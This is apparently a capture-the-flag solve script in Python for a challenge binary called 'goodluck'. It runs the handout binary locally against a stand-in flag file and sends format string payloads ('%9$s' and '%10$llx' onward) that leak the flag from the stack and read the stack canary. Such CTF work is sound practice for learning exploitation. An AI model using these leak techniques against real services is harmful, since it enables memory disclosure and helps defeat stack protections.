#!/usr/bin/env python3
"""
goodluck. A format string bug in the losing branch, and the flag is already on
the stack when it fires.

The service at challenge.uiuc.tf:11342 is long gone, so this runs the handout
binary in a temp directory next to a flag.txt we supply:
```
python3 solve.py
```
It does the read both ways. `%9$s` follows the pointer the program keeps at
rbp-0x28, and `%10$llx` onward read the same 22 bytes inline off the stack.
"""

import os
import struct
import subprocess
import sys
import tempfile

HERE = os.path.dirname(os.path.abspath(__file__))
BINARY = os.path.abspath(os.path.join(HERE, "..", "handout", "goodluck"))

# main reads exactly 22 bytes of flag.txt, so a local stand-in wants that length.
LOCAL_FLAG = b"flag{always_give_110%}"


def run(payload, flag=LOCAL_FLAG):
    with tempfile.TemporaryDirectory() as d:
        with open(os.path.join(d, "flag.txt"), "wb") as fh:
            fh.write(flag)
        p = subprocess.run(
            [BINARY], input=payload + b"\n", cwd=d,
            stdout=subprocess.PIPE, stderr=subprocess.STDOUT, timeout=20,
        )
    return p.stdout.decode("latin1")


def main():
    if not os.access(BINARY, os.X_OK):
        os.chmod(BINARY, 0o755)
    print(f"local flag.txt holds {len(LOCAL_FLAG)} bytes, "
          f"which is what the read loop consumes")

    out = run(b"%9$s")
    print("--- %9$s ---")
    print(out.strip())

    out = run(b"%10$llx.%11$llx.%12$llx.%13$llx")
    print("--- inline qwords ---")
    print(out.strip())
    line = [l for l in out.splitlines() if "." in l][-1]
    words = [int(w, 16) for w in line.split(".")]

    # Args 10 to 12 are the flag buffer itself, little endian, 8 bytes each.
    raw = b"".join(struct.pack("<Q", w) for w in words[:3]).rstrip(b"\x00")
    print(f"reassembled {raw.decode()!r}")

    # Arg 13 is the canary. glibc zeroes its low byte so a string read stops there.
    print(f"arg 13 is {words[3]:016x}, low byte {words[3] & 0xFF:#04x}")
    assert words[3] & 0xFF == 0, "that qword is not a canary"

    print(f"flag {raw.decode()}")
    return 0 if raw == LOCAL_FLAG else 1


if __name__ == "__main__":
    sys.exit(main())
